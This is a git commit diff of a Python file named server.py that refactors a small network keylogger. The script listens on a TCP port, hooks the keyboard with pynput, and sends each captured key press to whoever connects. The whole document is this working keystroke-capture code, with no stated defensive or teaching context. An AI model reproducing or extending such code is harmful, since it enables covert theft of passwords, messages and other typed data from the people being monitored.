80ceefb93138b3956c7fb536488e6da3d7ec8ba6
ultility <56175528+ultility@users.noreply.github.com>
2021-12-02 19:32:07 +0200

    Update server.py

--- python/1/server.py
+++ python/1/server.py
@@ -3,32 +3,45 @@ import socket
 from pynput.keyboard import Key, Listener
 import sys
 
-HOST = sys.argv[1]
-PORT = int(sys.argv[2])
-global conn
 
 def key_press(key):
 	k = str(key)
 	k = k.replace("'", "")
 	try:
+		global conn
 		conn.sendall(bytes(k, "ascii"))
-	except:
-		print("connection closed")
-
-while True:
+	except Exception as e:
+		print(e)
+def main():
 	with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
 		s.bind((HOST,PORT))
-		s.listen()
+		while True:
+			communicate(s)
 
-		conn, addr = s.accept()
-		listener = Listener(on_press=key_press)
-		listener.start()
-		with conn:
-			print('Connected by, ', addr)
-			while True:
+
+def communicate(Socket):
+	Socket.listen()
+	global conn
+	conn, addr = Socket.accept()
+	listener = Listener(on_press=key_press)
+	listener.start()
+	with conn:
+		print('Connected by, ', addr)
+		while True:
+			try:
 				data = conn.recv(1024)
-				if not data:
-					break
 				print(data.decode("ASCII"))
+				if len(data) == 0:
+					listener.stop()
+					break
+			except socket.error as e:
+				print("exception 1")
+				print(e.errno)
+				listener.stop()
+				break
 
 
+HOST = sys.argv[1]
+PORT = int(sys.argv[2])
+global conn
+main()
